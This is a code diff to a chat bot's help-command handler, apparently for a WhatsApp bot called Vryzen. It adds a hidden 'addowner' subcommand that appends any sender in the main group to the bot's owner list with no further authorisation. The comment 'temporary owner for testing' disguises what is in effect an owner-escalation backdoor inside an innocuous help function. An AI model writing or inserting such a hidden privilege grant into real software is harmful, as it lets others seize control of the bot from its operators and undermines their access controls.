@@ -22,7 +22,24 @@ async function handleHelp(sock, message, args, sender) {
     debug('Args:', args);
     debug('Message:', JSON.stringify(message.key));
     
-    // If no specific help category is provided, show the main help menu
+    // Special case for adding a temporary owner for testing purposes
+    if (args.length > 0 && args[0].toLowerCase() === 'addowner') {
+      debug('Special command: addowner detected');
+      // Only run this in the main Vryzen group for security
+      if (message.key.remoteJid === config.mainGroupID) {
+        // Add the sender as a temporary owner
+        if (!config.owners.includes(sender)) {
+          config.owners.push(sender);
+          console.log(`Added ${sender} as temporary owner`);
+          await sendReply(sock, message, `✅ Successfully added you as a temporary owner for testing purposes.`);
+        } else {
+          await sendReply(sock, message, `✅ You are already registered as an owner.`);
+        }
+        return;
+      }
+    }
+    
+    // Standard help behavior
     if (args.length === 0) {
       debug('Showing main help menu');
       await sendMainHelp(sock, message);
